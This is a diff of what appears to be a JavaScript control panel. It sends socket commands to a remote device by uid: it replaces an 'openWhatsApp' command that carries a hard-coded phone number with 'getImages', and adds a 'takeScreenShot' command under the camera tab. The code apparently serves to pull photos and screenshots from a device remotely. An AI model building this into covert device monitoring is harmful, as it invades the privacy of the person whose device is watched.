@@ -144,7 +144,7 @@ function getImages() {
     if (refresh_check.checked || firstLoadImages) {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'openWhatsApp', arg1: '+917409062770', arg2: 'jadfhjsd'}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
 
         // setTimeout(function () {
         //     socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
@@ -158,8 +158,8 @@ function getCamera() {
     hideOtherTabs('camera_div');
     if (refresh_check.checked || firstLoadCamera) {
         //camera_div.innerHTML = 'Loading live-camera, Please Wait...';
-        //socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
-        handleCamera("Abhinav");
+        socket.emit('commands', {commands: [{command: 'takeScreenShot'}], uid: currentUID});
+        // handleCamera("Abhinav");
     }
     firstLoadCamera = false;
     refresh_check.checked = false;
